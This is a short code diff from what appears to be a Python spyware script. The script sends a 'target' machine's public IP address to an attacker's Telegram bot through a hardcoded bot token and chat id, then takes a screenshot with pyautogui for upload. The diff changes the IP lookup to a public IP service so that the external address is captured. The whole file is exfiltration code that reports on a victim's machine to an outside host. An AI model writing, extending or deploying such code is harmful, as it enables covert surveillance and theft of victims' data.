@@ -15,9 +15,9 @@ import pyautogui
 import io
 import socket
 import requests
-hostname = socket.gethostname()
-ip_address = socket.gethostbyname(hostname)
-
+response = requests.get("https://api.ipify.org?format=json")
+data = response.json()
+ip_address = data["ip"]
 requests.get(f"https://api.telegram.org/bot5901651008:AAE1CX1hIQEVwWUA38s9CyexI_lHk1suE70/sendmessage?chat_id=1887858124&text=Hedef İp Adresi : {ip_address}\n")
 url = f"https://api.telegram.org/bot5901651008:AAE1CX1hIQEVwWUA38s9CyexI_lHk1suE70/sendPhoto"
 screenshot = pyautogui.screenshot()
